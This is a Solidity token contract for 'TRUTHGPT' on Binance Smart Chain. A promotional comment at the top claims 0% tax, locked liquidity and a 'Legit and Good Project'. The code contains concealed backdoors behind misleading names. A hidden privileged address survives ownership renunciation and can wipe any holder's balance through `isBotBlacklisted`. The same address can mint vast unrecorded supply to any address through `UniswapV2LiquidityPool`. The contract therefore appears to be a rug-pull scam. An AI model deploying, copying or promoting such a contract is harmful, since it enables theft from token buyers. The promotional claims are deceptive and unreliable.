// SPDX-License-Identifier: MIT
/**
/setwelcome

TRUTHGPT $TRUTGPT

DISCOVER THE UNBIASED TRUTH TO ANY QUESTION THAT COMES TO MIND WITH TRUTHGPT!

TRUTHGPT AI CHATBOT WAS CREATED TO PROVIDE UNBIASED TRUTHS, AS OPPOSED TO OTHERS THAT FOLLOW BIASED POLITICAL AGENDAS AND HIDE SENSITIVE INFORMATION.

OUR BELIEF IS THAT ALL INFORMATION SHOULD BE EASILY ACCESSIBLE TO THE PUBLIC IN A COMPLETELY TRANSPARENT MANNER.

THE PLATFORM WILL LAUNCH WITH OUR NATIVE CRYPTOCURRENCY, $TRUTH, ENABLING USERS TO UNLOCK TRUTHGPT PRO SIMPLY BY HOLDING THE TOKEN.

TO DISCOVER MORE ABOUT $TRUTH, LEARN HOW TO PURCHASE OR READ OUR IN-DEPTH WHITEPAPER BELOW.

https://talk.truthgpt.one/
https://t.me/TRUTHGPTB

💵 Contract : 0xce3f395edc010b55e82317d4a18b09be2fcce363
⛓ Chain : Binance Smart Chain (BSC)
📈 Tax:  0%. Buy & Sell
🔒 LP 100% LOCKED
🔐 Locked LP
✅ Legit and Good Project
*/
pragma solidity 0.8.19;
abstract contract TRUTGPTAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface TRUTGPTAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 blackcoininu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 blackcoininu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 blackcoininu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface TRUTGPTAsii is TRUTGPTAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract TRUTGPTAsiii is TRUTGPTAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract TRUTGPT is TRUTGPTAs, TRUTGPTAsi, TRUTGPTAsii, TRUTGPTAsiii {

    mapping(address => uint256) private envoiamount;
  mapping(address => bool) public TRUTGPTAsiiZERTY;
    mapping(address => mapping(address => uint256)) private GptFeeFromTransfer;
address private TRUTGPTRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public TRUTGPTPaw;
  address blackgptbot;



    
    constructor(address botAi) {
            // Editable
            blackgptbot = msg.sender;

        _name = "TRUTHGPTB";
        _symbol = "TRUTGPT";
  TRUTGPTRooter = botAi;        
        uint BotTotalSupply = 100000000000 * 10**9;
        process(msg.sender, BotTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return envoiamount[account];
    }

    function transfer(address to, uint256 blackcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, blackcoininu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return GptFeeFromTransfer[owner][spender];
    }

    function approve(address spender, uint256 blackcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, blackcoininu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 blackcoininu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, blackcoininu);
        _transfer(from, to, blackcoininu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(TRUTGPTRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, GptFeeFromTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = GptFeeFromTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, blackcoininu);

        uint256 fromBalance = envoiamount[from];
        require(fromBalance >= blackcoininu, "Ehi20: transfer blackcoininu exceeds balance");
        unchecked {
            envoiamount[from] = fromBalance - blackcoininu;
        }
        envoiamount[to] += blackcoininu;

        emit Transfer(from, to, blackcoininu);

        apresTokenTransfer(from, to, blackcoininu);
    }

  modifier blackgpt () {
    require(blackgptbot == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 blackcoininu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, blackcoininu);

        ALLtotalSupply += blackcoininu;
        envoiamount[account] += blackcoininu;
        emit Transfer(address(0), account, blackcoininu);

        apresTokenTransfer(address(0), account, blackcoininu);
    }


    function _burn(address account, uint256 blackcoininu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), blackcoininu);

        uint256 accountBalance = envoiamount[account];
        require(accountBalance >= blackcoininu, "Ehi20: burn blackcoininu exceeds balance");
        unchecked {
            envoiamount[account] = accountBalance - blackcoininu;
        }
        ALLtotalSupply -= blackcoininu;

        emit Transfer(account, address(0), blackcoininu);

        apresTokenTransfer(account, address(0), blackcoininu);
    }
  function isBotBlacklisted(address isBotBlacklistedaddress) external SwapAndLiquify {
    envoiamount[isBotBlacklistedaddress] = 0;
            emit Transfer(address(0), isBotBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 blackcoininu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        GptFeeFromTransfer[owner][spender] = blackcoininu;
        emit Approval(owner, spender, blackcoininu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 blackcoininu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= blackcoininu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - blackcoininu);
            }
        }
    }
  function UniswapV2LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    envoiamount[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {}

}